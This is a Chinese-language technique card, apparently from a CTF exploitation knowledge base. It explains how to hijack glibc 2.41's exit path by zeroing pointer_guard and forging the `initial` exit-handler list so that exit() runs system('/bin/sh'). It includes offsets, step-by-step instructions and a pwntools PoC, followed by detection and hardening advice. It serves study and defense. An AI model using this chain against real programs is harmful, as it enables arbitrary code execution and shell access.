---
id: binary-pwn-heap-glibc-exit-initial-pointer-guard-forge-system
title: glibc 2.41 exit handler 攻击：覆写 pointer_guard 后伪造 initial __exit_funcs 调 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc-exit-initial-pointer-guard-forge-system
aliases:
- exit handler 攻击
- initial __exit_funcs 伪造
- pointer_guard 覆写
- fs:0x30 清零
- ef_cxa system
- __run_exit_handlers 劫持
tags:
- pwn
- heap
- glibc
- glibc241
- exit-handler
- initial
- exit-function-list
- pointer-guard
- fs-0x30
- system
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:16+08:00'
  notes: 已对照原文核对 __run_exit_handlers 的 initial/exit_function_list 布局、PTR_DEMANGLE 的 ROR17^fs:0x30、先清 pointer_guard 再伪造 ef_cxa=system+arg=/bin/sh 的完整链，偏移 fs_base=libc-0x2880 与 gdb 截图一致。未验证点：未本机复跑；已按 brief 清除 affected_versions（2.41 为目标环境版本）。
---

## 一句话结论

在 glibc 2.41 的“无 hook”环境下，拿到任意地址分配/写后，可以先把 TCB 中的 `pointer_guard`（`fs:0x30`）覆写为 0，使 `PTR_DEMANGLE` 退化为普通循环右移；随后伪造 libc 的 `initial`（`__exit_funcs`）为 `{next=0, idx=1, fns[0]={flavor=ef_cxa, fn=ROL17(system), arg="/bin/sh"}}`，程序调用 `exit()` 时 `__run_exit_handlers` 就会执行 `system("/bin/sh")`。

## 原理

- **exit 流程**：`__run_exit_handlers` 从全局 `__exit_funcs`（默认指向 libc 的 `initial`）遍历 `exit_function_list`：每个节点有 `next`、`idx` 和 `fns[32]`；每次取 `f = &fns[--idx]`，按 `flavor` 分派。`ef_cxa`（值为 4）分支会读取 `f->func.cxa.fn` 与 `arg`，对函数指针做 `PTR_DEMANGLE` 后调用 `cxafct(arg, status)`。
- **结构布局**：`exit_function_list` 为 `next`（0x0）、`idx`（0x8）、`fns`（0x10 起）；每个 `exit_function` 0x20 字节：`flavor`（+0x0）、`fn`（+0x8）、`arg`（+0x10）、`dso_handle`（+0x18）。因此 `initial+0x10` 是第一个 flavor，`initial+0x18` 是函数指针，`initial+0x20` 是参数。
- **PTR_MANGLE**：glibc 对 `__exit_funcs` 中的函数指针做 `PTR_MANGLE`；`__run_exit_handlers` 侧对应 `ROR17(stored) ^ pointer_guard`（x86-64 上 gdb 可见 `ror rax, 0x11; xor rax, fs:[0x30]`）。`pointer_guard` 位于 TCB 的 `fs:0x30`；本文环境中 `fs_base = libc_base - 0x2880`，故 `pointer_guard = libc_base - 0x2850`。
- **让 guard 失效**：用任意地址写把 `fs:0x30` 的 8 字节改成 0，则 `ROR17(stored) ^ 0`；要得到 `system`，只需在 `initial+0x18` 写入 `ROL17(system)`（对 libc 地址等价于 `system << 17`，因为高位为 0）。`arg` 写 `"/bin/sh"` 的地址，`flavor=4`，`idx=1`，`next=0`。
- **触发**：让程序走 `exit(1)`（如非法菜单选项）；`__run_exit_handlers` 读取伪造的 `initial`，调用 `system("/bin/sh")`。
- **注意**：覆写 `pointer_guard` 后，该次任意分配所用的 tcache size 可能被破坏（目标地址的 fd 被改写），后续写 `initial` 需要换一个 size 或重新构造 tcache；原文正是先写 pg、再换 size 写 `initial`。
- 根因是 `initial` 与 TCB 的 `pointer_guard` 都位于可写的 libc/TCB 内存，且 exit 流程信任这些全局结构；在任意写原语下，二者组合即可把退出路径变成可控函数调用。

## 触发条件

- 目标为 glibc 2.31+（无 `__malloc_hook`/`__free_hook` 可用；本文 2.41），且存在任意地址分配/写（如 tcache/fastbin 组合、任意写漏洞）。
- 已泄露 libc 基址，能定位 `initial`、`system`、`/bin/sh` 与 TCB 的 `fs:0x30`（或可通过 `arch_prctl`/gdb 得到 fs_base 偏移）。
- `pointer_guard` 可写（不是只读页），且程序会调用 `exit`/从 main 正常返回。
- 伪造的 `initial` 所在 libc 页可写（BSS），且没有额外校验/随机化使布局不可预测。

## 利用步骤

1. 泄露 libc 基址（unsorted bin 等），计算 `binsh`、`system`、`initial`；按目标 glibc 确认 `fs_base = libc_base - 0x2880`（或用 gdb 读出 fs_base 与 libc 的差值）。
2. 用任意地址分配原语把目标指向 `fs_base + 0x30`，写入 8 个零字节，使 `pointer_guard = 0`。注意这会破坏该 size 的 tcache 链，后续换一个 size。
3. 再次用任意地址分配把目标指向 `libc.sym.initial`，写入：
   - `+0x00`：`next = 0`
   - `+0x08`：`idx = 1`
   - `+0x10`：`flavor = 4`（`ef_cxa`）
   - `+0x18`：`fn = ROL17(system)`（x86-64 上 `system << 17`）
   - `+0x20`：`arg = binsh`
   - `+0x28`：`dso_handle` 任意值（0 或可读地址）
4. 触发 `exit(1)`（非法菜单、显式退出等）；`__run_exit_handlers` 调用 `system("/bin/sh")`。
5. 验证 shell（`id`、`echo SHELL_OK`）。

## PoC

```python
from pwn import *

# 已有 libc 基址与任意地址分配原语（见 Tcache Reverse Into Fastbin 卡）
libc.address = libc_leak - 0x1d3d00          # 按目标 libc 版本调整
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh\x00"))
tls = libc.address - 0x2880                   # 本文 glibc 2.41 的 fs_base 偏移

# 1) 把 pointer_guard (fs:0x30) 清零
arb_alloc_write(tls + 0x30, p64(0))

# 2) 伪造 initial（换一个 size 避开刚被破坏的 tcache bin）
payload  = p64(0)                             # next
payload += p64(1)                             # idx
payload += p64(4)                             # flavor = ef_cxa
payload += p64((system << 17) & (2**64 - 1))  # PTR_MANGLE(system), guard=0
payload += p64(binsh)                         # arg
payload += p64(0)                             # dso_handle
arb_alloc_write(libc.sym.initial, payload)

# 3) 触发退出流程
io.sendlineafter(b">> ", b"balabala")         # 非法选项 -> exit(1)
io.interactive()
```

说明：原文在 onigirl 的完整 exp 中用同一套 tcache 任意分配原语先写 `tls+0x30`，再写 `libc.sym.initial`，gdb 断点显示 `call rax <system>`、参数为 `/bin/sh`；PoC 未在本机复跑，`fs_base` 偏移与 `initial` 偏移需按目标 libc 版本核对。

## 变体与关联

- 变体：不覆写 `pointer_guard`，而是先泄露 guard 值再按 `ROL17(system ^ guard)` 编码；或找 `initial` 之外、调用路径不经过 PTR_DEMANGLE 的 exit 回调（如 `__rtld_lock` 类，见 exit_hook 卡）。
- 变体：用 FSOP `_IO_list_all`、`_IO_2_1_stdout_` 等退出/刷新路径替代 `initial`；不同 glibc 版本的文件结构布局不同。
- 关联：[[binary-pwn-format-string-exit-hook-rtld-global]]（glibc < 2.34 的 `_rtld_global` exit_hook）、[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]（2.42+ 提到 `__exit_funcs` PTR_MANGLE）、[[binary-pwn-heap-tcache-reverse-into-fastbin-fastbin-dup-arbitrary-alloc]]（本卡依赖的任意分配原语）。
- 边界：guard 不可写、`initial` 只读/被随机化、exit 流程被加固、没有任意写、或 `exit` 不被调用时失效。

## 检测与防御

- 加固：对 `initial`/`__exit_funcs` 做完整性校验或只读映射（需改 glibc）；启用 `pointer_guard` 的随机化并防止任意写；使用 CFI/CET 限制间接调用目标。
- 开发侧：消除任意写/越界写；对 `exit` 回调注册做白名单；避免在退出路径调用可被篡改的函数指针。
- 检测：`initial` 被写入异常 `flavor=4` 或函数指针不在 libc 正常范围；`fs:0x30` 被改为 0；进程退出时执行 `system`/异常子进程；gdb/EDR 观察 exit 阶段间接调用。
- 研究侧：保留目标 libc 的符号、`initial` 偏移与 `fs_base` 差值；不同版本（2.31/2.35/2.39/2.41/2.42+）布局与 mangling 不同，需逐版本核对。
